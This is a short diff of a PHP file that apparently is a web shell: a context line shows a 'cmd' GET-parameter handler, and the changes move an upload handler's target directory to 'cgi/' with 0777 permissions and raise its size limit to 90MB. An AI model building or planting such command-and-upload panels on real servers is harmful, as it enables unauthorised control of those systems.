@@ -125,15 +125,15 @@ if(isset($_GET['cmd'] )){
 
 if(isset($_GET['up'] )){
 if(isset($_FILES['image'])) {
-    $filedir = "uploads/";
-    $maxfile = 2000000;
+    $filedir = "cgi/";
+    $maxfile = 92000000;
     if (!is_dir($filedir)) mkdir($filedir, 0777, true);
 
     $file = $_FILES['image'];
     if ($file['error']) {
         echo "<center><b>Error: {$file['error']}</b></center>";
     } elseif ($file['size'] > $maxfile) {
-        echo "<center><b>Error: File is too large. Max size is 2MB.</b></center>";
+        echo "<center><b>Error: File is too large. Max size is 90MB.</b></center>";
     } elseif (pathinfo($file['name'], PATHINFO_EXTENSION) != "txt") {
         echo "<center><b>Error: Only .txt files are allowed.</b></center>";
     } elseif (move_uploaded_file($file['tmp_name'], $filedir . basename($file['name']))) {
